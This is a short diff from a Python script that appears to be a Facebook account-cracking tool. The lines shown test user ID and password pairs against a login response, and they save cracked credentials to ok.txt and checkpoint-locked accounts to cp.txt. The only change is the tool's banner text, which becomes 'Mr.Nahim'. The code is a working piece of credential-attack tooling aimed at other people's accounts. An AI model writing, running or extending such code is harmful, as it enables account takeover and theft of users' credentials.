@@ -374,7 +374,7 @@ class Main:
 				open("ok.txt","a").write("   [=NAHIM=OK=>]  %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r  \033[0;92m   [=NAHIM=CP=>] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;92m   [=Mr.Nahim=CP=>] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("cp.txt","a").write("   [=NAHIM=CP=>]  %s|%s\n"%(uid, pw))
 				break
